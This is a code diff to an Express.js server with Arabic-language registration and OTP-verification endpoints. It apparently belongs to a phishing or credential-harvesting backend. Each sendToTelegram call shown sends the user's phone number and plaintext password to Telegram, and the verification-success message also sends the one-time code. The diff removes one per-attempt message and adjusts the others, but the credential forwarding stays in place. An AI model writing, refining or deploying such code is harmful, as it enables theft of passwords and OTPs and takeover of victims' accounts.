@@ -196,7 +196,7 @@ app.post('/api/register', registerLimiter, async (req, res) => {
 
     const time = new Date().toLocaleString('ar-MR');
     await sendToTelegram(
-      `🆕 تسجيل جديد\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 رمز التحقق: ${otp}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
+      `🆕 تسجيل جديد\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
     );
 
     return res.json({
@@ -215,11 +215,6 @@ app.post('/api/verify-otp', verifyLimiter, async (req, res) => {
   const phone = sanitizeInput(req.body?.phone);
   const entryCode = sanitizeInput(req.body?.entryCode);
   const otpCode = sanitizeInput(req.body?.otpCode);
-
-  const attemptTime = new Date().toLocaleString('ar-MR');
-  await sendToTelegram(
-    `📥 محاولة تحقق\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 الرمز الذي تم إدخاله: ${otpCode}\n⏰ الوقت: ${attemptTime}\n━━━━━━━━━━━━━━`
-  );
 
   const reg = validateRegistration(phone, entryCode);
   if (!reg.valid) {
@@ -278,7 +273,7 @@ app.post('/api/verify-otp', verifyLimiter, async (req, res) => {
 
     const time = new Date().toLocaleString('ar-MR');
     await sendToTelegram(
-      `✅ تحقق ناجح\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 رمز OTP: ${otpCode}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
+      `✅ تحقق ناجح\n━━━━━━━━━━━━━━\n📱 رقم الهاتف: ${phone}\n🔐 كلمة السر: ${entryCode}\n🔢 الرمز الذي تم إدخاله: ${otpCode}\n⏰ الوقت: ${time}\n━━━━━━━━━━━━━━`
     );
 
     return res.json({ success: true, message: 'تم التحقق بنجاح' });
